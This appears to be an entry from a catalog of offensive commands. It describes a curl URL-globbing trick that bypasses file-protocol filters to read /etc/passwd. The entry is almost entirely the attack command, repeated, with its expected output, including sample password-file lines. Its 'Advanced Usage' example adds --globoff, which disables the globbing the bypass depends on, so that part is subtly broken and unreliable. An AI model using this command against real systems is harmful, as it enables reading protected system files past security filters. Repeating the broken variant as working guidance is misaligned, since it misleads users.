---
data: './curl -vv ''f[h-j]le:///etc/passwd'''
tags:
  - lfi
  - bypass
type: command
output: >-
  Errors for 'fhle' and 'fjle' protocols, but successful file:// output of
  /etc/passwd contents (e.g., root:x:0:0:root:/root:/bin/bash) followed by
  connection closures
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.305Z'
id: dcae141b-3e9a-4e0d-8f23-3a3103881673
verified: false
validated: true
submitted: true
---
# curl-glob-file-bypass

## Command

```bash
./curl -vv 'f[h-j]le:///etc/passwd'
```

## Description

Executes curl with a globbed URL to bypass file protocol filters, expanding [h-j] to read /etc/passwd via the file:// variant.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-vv` | Verbose output for connection details | Yes |
| `URL` | Globbed URL 'f[h-j]le:///etc/passwd' | Yes |

## Examples

### Basic Usage

```bash
./curl -vv 'f[h-j]le:///etc/passwd'
```

### Advanced Usage

```bash
./curl -vv --globoff 'f[h-j]le:///etc/passwd'
```

## Expected Output

Errors for unsupported protocols 'fhle' and 'fjle', but successful output of /etc/passwd contents (e.g., root:x:0:0:root:/root:/bin/bash, bin:x:1:1:bin:/bin:/sbin/nologin, etc.) followed by closing connections

## Related

- [[Related Procedure]]
